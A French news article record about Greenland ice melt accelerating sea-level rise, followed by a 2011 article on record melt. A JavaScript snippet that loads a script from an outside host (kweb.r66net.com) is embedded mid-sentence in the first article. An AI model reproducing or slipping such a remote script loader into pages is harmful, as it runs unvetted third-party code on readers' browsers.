{"title": "La fonte du Groenland accelere la montee des oceans", "newspaper": "Futura Sciences", "author": ["AFP PARIS"], "date_publi": "2017-07-01", "content": "Une nouvelle etude, qui se distingue des projections prudentes du Giec, montre que la montee des eaux est en train de s'accelerer. La fonte de la calotte glaciaire du Groenland en est desormais responsable a 25 %, contre 5 % il y a 20 ans. En 2014, le niveau des oceans a augmente d'environ 3,3 mm, contre 2,2 en 1993, indiquent les auteurs d'une etude qui vient de paraitre dans la revue  Nature Climate Change . Ces conclusions risquent d'accroitre encore l'inquietude des scientifiques qui redoutent que le niveau des oceans monte plus vite que cela avait ete prevu il y a encore quelques annees, avec les consequences potentiellement desastreuses que cela suppose. En effet, des centaines de millions de personnes vivent dans des zones situees sous le  niveau de la mer . D'importantes  villes cotieres sont menacees  et de petites iles se preparent deja a etre submergees. << Ces conclusions sont importantes >>  parce que le  Giec , le Groupe d'experts intergouvernemental sur l'evolution du  climat ,  << fait une projection tres prudente de la  hausse du niveau de la mer  d'ici a la fin du siecle : 60 a 90 cm >> , a reagi Peter Wadhams, professeur de  physique  des oceans a l'universite d'Oxford, qui n'a pas participe a cette etude. Cette estimation, ajoute-t-il, suppose que la  vitesse  a laquelle les oceans montent va rester stable. Voir aussi : Fonte des glaces : simulez la montee du niveau de la mer chez vous ! << Il y a pourtant des preuves convaincantes -- dont l'acceleration de la fonte du Groenland et de l' Antarctique --  que cette vitesse est en fait en train d'augmenter, et de maniere exponentielle >> , souligne-t-il. A noter qu'a lui tout seul, le Groenland contient assez d'eau gelee pour faire monter le niveau des oceans d'environ sept metres.  << La plupart des scientifiques s'attendent desormais a ce que la hausse totale depasse largement le metre d'ici la fin du siecle >> , a declare le chercheur. Situees dans l'ocean Pacifique, les iles Kiribati (Oceanie), dont l'altitude est peu elevee, sont gravement menacees par la montee des eaux. Cette image a ete prise par Spot 6 en 2015. (c) Airbus DS, 2015                       Comment mesurer le niveau de la mer ? Cette nouvelle etude reconcilie pour la premiere fois les resultats de deux methodes distinctes de mesures du niveau de la mer :  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La premiere consiste a examiner la contribution a cette hausse de trois elements : la  dilatation  de l'ocean due au  rechauffement climatique  ; les modifications dans la quantite d'eau stockee sur  terre  ; la fonte de la glace provenant de  glaciers  et de la  calotte glaciaire  a la fois au  Groenland  et en  Antarctique . La seconde, l' altimetrie  satellitaire, consiste a mesurer la distance entre un satellite et la surface de la mer. Jusqu'a present, les donnees fournies par ces deux methodes montraient peu de changements dans les niveaux de la mer ces vingt dernieres annees, meme si d'autres mesures laissaient peu de place au doute quant a une hausse du niveau des oceans. Les chercheurs ont  << corrige un biais, petit mais important, dans les donnees satellitaires de la premiere decennie >> , explique a l'AFP Xuebin Zhang, professeur au  National Laboratory for Marine Science and Technology , a Qingdao, en Chine. Au debut des annees 1990, la moitie de la hausse s'expliquait par la dilatation due au rechauffement, contre 30 % 20 ans plus tard. En revanche, le Groenland y contribue desormais pour 25 %, contre 5 % il y a 20 ans. Pour en savoir plus Nouvelle fonte record pour les glaces du Groenland Article de Bruno Scala publie le 30/11/2011 De nouvelles observations des glaces du Groenland viennent confirmer une tendance : la fonte s'accelere. Les causes ? Une multitude de facteurs formant un cycle irreversible, comme nous l'expliquent  Valerie Masson-Delmotte , de l'Institut Pierre-Simon-Laplace, et Hubert Gallee, du Laboratoire de glaciologie et geophysique de l'environnement . Un recent rapport fonde sur les observations de la  fonte des glaces au Groenland  vient confirmer une tendance deja fortement soupconnee : cette fonte s'accelere. <<  Depuis le milieu des annees 1990, on observe un gros  rechauffement  qui s'est effectue tres brutalement , commente ainsi Valerie Masson-Delmotte, chercheuse a l' Institut Pierre-Simon-Laplace .  Et la periode 2000-2010 sort du lot  >> insiste-t-elle. Pour arriver a cette conclusion, une equipe de chercheurs, emmenee par Marco Tedesco ( City College  de New York ) et Xavier Fettweis ( universite de Liege ), a analyse l' evolution des glaces du Groenland  grace a deux outils. Deux outils pour mesurer la fonte des glaces D'abord un outil d'observation qui repose sur la reception de micro-ondes par un satellite. Ces  ondes electromagnetiques  sont emises par les champs de neige. <<  Les proprietes des ondes qui sont recues changent lorsque le  manteau  neigeux contient de l'eau  liquide , explique  Hubert Gallee , chercheur au  Laboratoire de glaciologie et geophysique de l'environnement  de Grenoble, contacte par Futura-Sciences.  Cependant, il y a un petit  souci  avec ce systeme puisque ces ondes sont egalement absorbees par les  gouttes  de pluie tombant dans l' air .  >> Il faut donc un autre systeme pour limiter ce biais. L'anomalie de la fonte journaliere de l'annee 2011 par rapport a la periode 1979-2010, a savoir le nombre de jours de fonte en 2011 auquel est soustraite la moyenne de jours de fonte sur la periode 1979-2010. (c) Tedesco  et al.  2011                       Un outil complementaire permet de representer la concentration des gouttes de pluie dans l'air et de se faire une bonne idee de l'etat des glaces : la  modelisation . MAR (modele atmospherique regional) a ete developpe par Hubert Gallee. <<  C'est un modele meteorologique qui permet de prevoir le temps en region polaire mais surtout de voir l'evolution de l' atmosphere  et des champs de neige  >>, decrit-il. L'utilisation de cet outil permet d'une part de confirmer les resultats obtenus grace a l'observation par micro-ondes, d'autre part son modele de neige calcule le taux d'ecoulement de l'eau, ce dont ne tiennent pas compte les donnees satellitaires. Un cycle irreversible accelerant la fonte des glaces Lorsque la neige ou la glace fond, l'eau qui en resulte s'ecoule vers le bas. Si elle entre en contact avec une couche de neige plus profonde et plus froide, elle gele a nouveau. Si ce n'est pas le cas, elle finira par s'ecouler lateralement, le long des pentes pour in fine terminer sa course dans l'ocean. En mesurant cet ecoulement, on peut evaluer la quantite de glace qui est effectivement perdue. Les chercheurs ont donc pu mesurer, pour l'annee 2011, une  fonte exceptionnelle , bien au-dessus de la moyenne de la periode 1979-2010 et meme proche des records. Pourtant, les temperatures n'etaient pas particulierement elevees (le printemps 2011 etait meme plutot froid). Elles l'etaient cependant en 2010. Mecanisme cyclique de la fonte des glaces. Les conditions climatiques provoquent une augmentation de la temperature de la surface qui accelere la fonte et une diminution des precipitations de neige, ce qui expose davantage de glace non recouverte au soleil, entrainant une diminution de l'albedo et donc une fonte de la glace. Le cycle se repete ensuite. (c) Tedesco  et al.  2011                       Les scientifiques expliquent que, bien sur, la temperature n'est pas l'unique facteur ayant une influence sur la fonte des glaces, mais qu'un ensemble d'elements contribue egalement a ce phenomene, parmi lesquels l'ecoulement de l'eau, les  precipitations  de neige, l' effet albedo , la vitesse du  vent , etc. Tous ces facteurs interviennent dans la fonte de la  glace du Groenland . Si bien que la glace peut fondre de facon abondante meme si les temperatures de l'air ne sont pas exceptionnellement elevees. Si le  glacier  observe par les auteurs de l'etude se situe a l'ouest du Groenland, une zone particulierement touchee par la  fonte des glaces , il semblerait neanmoins que ce principe soit applicable a tous les  glaciers  et que l'acceleration de la fonte soit un phenomene generalise. Et qui ne semble pas  reversible . Peu rassurant. ", "theme": "planete"}